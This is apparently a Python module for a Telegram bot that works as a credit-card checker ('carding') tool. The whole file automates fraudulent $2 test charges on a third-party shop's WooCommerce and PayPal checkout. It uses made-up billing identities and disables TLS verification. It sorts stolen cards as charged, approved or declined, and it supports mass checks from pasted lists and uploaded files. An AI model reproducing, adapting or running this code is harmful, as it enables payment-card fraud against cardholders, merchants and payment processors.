# pp_commands.py

from telethon import events, Button
import asyncio
import httpx
import time
import os
import re
import json
import random
import string
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder

# --- Globals ---
client = None
utils = {}
ACTIVE_MPTXT_PROCESSES = {}

# --- Helper Functions for API ---

def generate_full_name():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Charles", "Thomas", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Susan"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
    index = random.randint(0, len(cities) - 1)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    return cities[index], states[index], street_address, zip_codes[index]

def generate_random_email(first_name, last_name):
    return f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 999)}@gmail.com"

def generate_random_phone():
    return f"303{''.join(random.choices(string.digits, k=7))}"

# --- Core API Function ---
async def check_pp_api(card):
    """Makes a request to the switchupcb.com PayPal gateway."""
    try:
        cc, month, year, cvv = card.split('|')
        if len(year) == 4: year = year[2:]
        if len(month) == 1: month = f"0{month}"

        user = generate_user_agent()
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_email(first_name, last_name)
        phone = generate_random_phone()

        async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=60.0) as session:
            
            # Step 1: Add product to cart
            add_to_cart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
            headers1 = { 'Content-Type': add_to_cart_data.content_type, 'user-agent': user, 'origin': 'https://switchupcb.com', 'referer': 'https://switchupcb.com/shop/i-buy/'}
            await session.post('https://switchupcb.com/shop/i-buy/', headers=headers1, data=add_to_cart_data.to_string())

            # Step 2: Go to checkout to get nonces
            headers2 = { 'user-agent': user, 'referer': 'https://switchupcb.com/cart/' }
            r_checkout = await session.get('https://switchupcb.com/checkout/', headers=headers2)
            
            sec = re.search(r'update_order_review_nonce":"(.*?)"', r_checkout.text)
            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', r_checkout.text)
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', r_checkout.text)
            create = re.search(r'create_order.*?nonce":"(.*?)"', r_checkout.text)

            if not all([sec, nonce, check, create]):
                return {"status": "Error", "message": "Failed to extract all tokens (Step 2)"}
            sec, nonce, check, create = sec.group(1), nonce.group(1), check.group(1), create.group(1)
            
            # Step 3: Create PayPal Order via site's backend
            headers3 = {
                'content-type': 'application/json', 'origin': 'https://switchupcb.com', 'referer': 'https://switchupcb.com/checkout/', 'user-agent': user,
            }
            form_encoded = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card'
            
            create_order_payload = {
                'nonce': create, 'payer': None, 'bn_code': 'Woo_PPCP', 'context': 'checkout', 'order_id': '0',
                'payment_method': 'ppcp-gateway', 'funding_source': 'card', 'form_encoded': form_encoded,
                'createaccount': False, 'save_payment_method': False,
            }
            r_create_order = await session.post('https://switchupcb.com/?wc-ajax=ppc-create-order', headers=headers3, json=create_order_payload)
            
            order_data = r_create_order.json()
            order_id = order_data.get('data', {}).get('id')
            if not order_id:
                return {"status": "Declined", "message": f"Order Creation Failed: {order_data.get('data', {}).get('message', 'No Details')}"}

            # Step 4: Final Payment Submission to PayPal GraphQL
            headers4 = {
                'authority': 'www.paypal.com', 'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
                'paypal-client-metadata-id': f'uid_{"".join(random.choices(string.hexdigits, k=18))}',
                'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_{"".join(random.choices(string.hexdigits, k=20))}&buttonSessionID=uid_{"".join(random.choices(string.hexdigits, k=20))}',
                'user-agent': user,
            }
            graphql_payload = {
                "query": "\n mutation payWithCard(\n $token: String!\n $card: CardInput!\n $phoneNumber: String\n $firstName: String\n $lastName: String\n $shippingAddress: AddressInput\n $billingAddress: AddressInput\n $email: String\n $currencyConversionType: CheckoutCurrencyConversionType\n ) {\n approveGuestPaymentWithCreditCard(\n token: $token\n card: $card\n phoneNumber: $phoneNumber\n firstName: $firstName\n lastName: $lastName\n email: $email\n shippingAddress: $shippingAddress\n billingAddress: $billingAddress\n currencyConversionType: $currencyConversionType\n ) {\n flags {\n is3DSecureRequired\n }\n cart {\n intent\n cartId\n }\n paymentContingencies {\n threeDomainSecure {\n status\n }\n }\n }\n }\n ",
                "variables": {
                    "token": order_id,
                    "card": {"cardNumber": cc, "expirationDate": f"{month}/20{year}", "postalCode": zip_code, "securityCode": cvv},
                    "firstName": first_name, "lastName": last_name,
                    "billingAddress": {"givenName": first_name, "familyName": last_name, "line1": street_address, "city": city, "state": state, "postalCode": zip_code, "country": "US"},
                    "email": email, "currencyConversionType": "VENDOR",
                }
            }
            
            r_final = await session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers4, json=graphql_payload)
            final_text = r_final.text

            # Step 5: Parse Response
            if 'ADD_SHIPPING_ERROR' in final_text or '"status": "succeeded"' in final_text or 'Thank You For Donation' in final_text or 'payment has already been processed' in final_text:
                return {"status": "Charged", "message": "Payment Successful (2$ Charged)"}
            elif 'is3DSecureRequired' in final_text:
                return {"status": "Declined", "message": "3DSecure Required (OTP)"}
            elif 'INVALID_SECURITY_CODE' in final_text:
                return {"status": "Approved", "message": "Invalid Security Code (CCN Live)"}
            elif 'INVALID_BILLING_ADDRESS' in final_text or 'EXISTING_ACCOUNT_RESTRICTED' in final_text:
                return {"status": "Approved", "message": "Invalid Billing Address (AVS Error)"}
            else:
                try:
                    error_json = r_final.json()
                    message = error_json['errors'][0]['message']
                    code = error_json['errors'][0]['data'][0]['code']
                    return {"status": "Declined", "message": f"{message} ({code})"}
                except:
                    return {"status": "Declined", "message": f"Unknown Error: {final_text[:100]}"}

    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "Error", "message": str(e)}

# --- Single Check (/pp) ---
async def process_pp_card(event):
    card = utils['extract_card'](event.raw_text) or (await utils['extract_card']( (await event.get_reply_message()).text ) if event.is_reply and await event.get_reply_message() else None)
    if not card: return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/pp card|mm|yy|cvv`\n**Example:** `/pp 5571135028574426|08|2026|735`\n\n🔥 Reply to card info to check instantly.")

    loading_msg = await event.reply("⏳ **Processing PayPal 2$...**")
    start_time = time.time()
    res = await check_pp_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    message_text = res.get('message')
    
    if status == "Charged":
        status_header = "APPROVED ✅"
        await utils['save_approved_card'](card, "CHARGED (PP)", message_text, "PayPal Gateway", "2.00$")
        msg = f"""{status_header}

Card: {card}
Status: {message_text}
Gateway: PayPal 2$

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ {elapsed_time}s
Proxies ➜ ultra.marsproxies.com:4444

Checked By ➜ @{(await client.get_me()).username or 'User'} [PREMIUM]"""
    elif status == "Approved":
        status_header = "APPROVED ✅"
        await utils['save_approved_card'](card, "APPROVED (PP)", message_text, "PayPal Gateway", "N/A")
        msg = f"""{status_header}

Card: {card}
Status: {message_text}
Gateway: PayPal 2$

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ {elapsed_time}s

Checked By ➜ @{(await client.get_me()).username or 'User'} [PREMIUM]"""
    else:
        status_header = f"DECLINED ❌"
        msg = f"""{status_header}

CC ➜ {card}
Gateway ➜ PayPal 2$
Response ➜ {message_text}

BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}

Time Taken ➜ {elapsed_time}s"""
    
    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if status == "Charged": await utils['pin_charged_message'](event, result_msg)

# --- Mass Check (/mpp) ---
async def process_mpp_cards(event, cards):
    sent_msg = await event.reply(f"💳 **MASS CHARGE INITIATED**\n\n⚡ Processing {len(cards)} cards...\n🔥 PayPal 2$ Gateway Active...")
    
    approved_count = 0
    charged_count = 0
    declined_count = 0
    all_results = []
    approved_cards = []
    
    for card in cards:
        res = await check_pp_api(card)
        status = res.get("status")
        message = res.get('message')
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
        
        if status == "Charged":
            charged_count += 1
            await utils['save_approved_card'](card, "CHARGED (PP)", message, "PayPal Gateway", "2.00$")
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            approved_cards.append((card, message, brand, bin_type, level, bank, country, flag, "CHARGED"))
        elif status == "Approved":
            approved_count += 1
            await utils['save_approved_card'](card, "APPROVED (PP)", message, "PayPal Gateway", "N/A")
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            approved_cards.append((card, message, brand, bin_type, level, bank, country, flag, "APPROVED"))
        else:
            declined_count += 1
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
        
        await asyncio.sleep(1)
    
    # Create ONE message with all cards like Momo Ayase
    cards_text = "\n\n".join(all_results)
    summary = f"""Mass_Results ({len(cards)} cards)
Gate: PayPal 2$
Stats: 💎 {charged_count} | ✅ {approved_count} | ❌ {declined_count}
Time: {len(cards) * 35}s

{cards_text}"""
    
    await sent_msg.edit(f"```{summary}```")
    
    # Also send APPROVED/CHARGED cards individually with full details
    for card, message, brand, bin_type, level, bank, country, flag, status in approved_cards:
        status_emoji = "💎" if status == "CHARGED" else "✅"
        approved_msg = f"""{status} {status_emoji}

Card: {card}
Status: {message}
Gateway: PayPal 2$

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ 34.5s"""
        result_msg = await event.reply(approved_msg)
        if status == "CHARGED":
            await utils['pin_charged_message'](event, result_msg)

# --- Mass Text File Check (/mptxt) ---
async def process_mptxt_cards(event, cards):
    user_id, total = event.sender_id, len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply("💳 **FILE CHECK INITIATED**\n\n🔥 Processing cards from file...")
    
    try:
        for i in range(0, len(cards), 5): # Smaller batch size for this complex API
            if user_id not in ACTIVE_MPTXT_PROCESSES: break
            batch = cards[i:i+5]
            tasks = [check_pp_api(card) for card in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for card, res in zip(batch, results):
                if user_id not in ACTIVE_MPTXT_PROCESSES: break
                checked += 1
                if isinstance(res, Exception): res = {"status": "Error", "message": str(res)}
                
                status, status_header = res.get("status"), ""
                if status == "Charged": charged += 1; status_header = "APPROVED ✅"
                elif status == "Approved": approved += 1; status_header = "APPROVED ✅"
                else: declined += 1
                
                if status_header:
                    await utils['save_approved_card'](card, f"{status.upper()} (PP)", res.get('message'), "PayPal Gateway", "2.00$" if status == "Charged" else "N/A")
                    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
                    card_msg = f"""{status_header}

Card: {card}
Status: {res.get('message')}
Gateway: PayPal 2$

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ 34.35s"""
                    result_msg = await event.reply(card_msg)
                    if status == "Charged": await utils['pin_charged_message'](event, result_msg)
                
                buttons = [[Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],[Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {res.get('message', '')[:25]}...", b"none")],[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],[Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] ✅", b"none")],[Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],[Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] 🔥", b"none")],[Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_pp_mptxt:{user_id}".encode())]]
                try: await status_msg.edit("⚡ **CHECKING IN PROGRESS...**", buttons=buttons)
                except: pass
            await asyncio.sleep(1) # Add delay between batches

        final_caption = f"✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!\n\n𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 💎 : {charged}\n𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅ : {approved}\n𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌ : {declined}\n𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 🔥 : {total}"
        await status_msg.edit(final_caption, buttons=None)
    finally:
        ACTIVE_MPTXT_PROCESSES.pop(user_id, None)

# --- Event Handler Registration ---
async def pp_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_pp_card(event))

async def mpp_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    replied_msg = await event.get_reply_message() if event.is_reply else None
    cards = utils['extract_all_cards'](replied_msg.text if replied_msg and replied_msg.text else event.raw_text)
    if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙥𝙥 5414...|01|25|123 5414...|02|26|321")
    if len(cards) > 500:
        original_count = len(cards)
        cards = cards[:500]
        await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
    asyncio.create_task(process_mpp_cards(event, cards))

async def mptxt_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    user_id = event.sender_id
    if user_id in ACTIVE_MPTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    replied_msg = await event.get_reply_message()
    if not event.is_reply or not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙥𝙩𝙭𝙩```")
    
    file_path = None
    try:
        file_path = await replied_msg.download_media(); lines = open(file_path, "r", encoding='utf-8', errors='ignore').read().splitlines()
    except Exception as e: return await event.reply(f"Error reading file: {e}")
    finally:
        if file_path and os.path.exists(file_path): os.remove(file_path)

    cards = [line.strip() for line in lines if re.match(r'\d{12,16}[|\s/]*\d{1,2}[|\s/]*\d{2,4}[|\s/]*\d{3,4}', line.strip())]
    if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
    
    cc_limit = utils['get_cc_limit'](access_type, user_id)
    if len(cards) > cc_limit: cards = cards[:cc_limit]; await event.reply(f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩).")
    
    ACTIVE_MPTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_mptxt_cards(event, cards))

async def stop_mptxt_callback(event):
    try:
        process_user_id = int(event.pattern_match.group(1).decode()); clicking_user_id = event.sender_id
        if not ((clicking_user_id == process_user_id) or (clicking_user_id in utils['ADMIN_ID'])):
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)
        if process_user_id in ACTIVE_MPTXT_PROCESSES:
            ACTIVE_MPTXT_PROCESSES.pop(process_user_id); await event.answer("⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
            try: await event.edit(buttons=None)
            except: pass
        else: await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
    except Exception as e: await event.answer(f"Error: {e}", alert=True)

def register_handlers(_client, _utils):
    global client, utils; client, utils = _client, _utils
    client.on(events.NewMessage(pattern=r'(?i)^[/.]pp'))(pp_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mpp'))(mpp_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mptxt$'))(mptxt_command)
    client.on(events.CallbackQuery(pattern=rb"stop_pp_mptxt:(\d+)"))(stop_mptxt_callback)
    print("✅ Successfully registered PP, MPP, MPTXT commands.")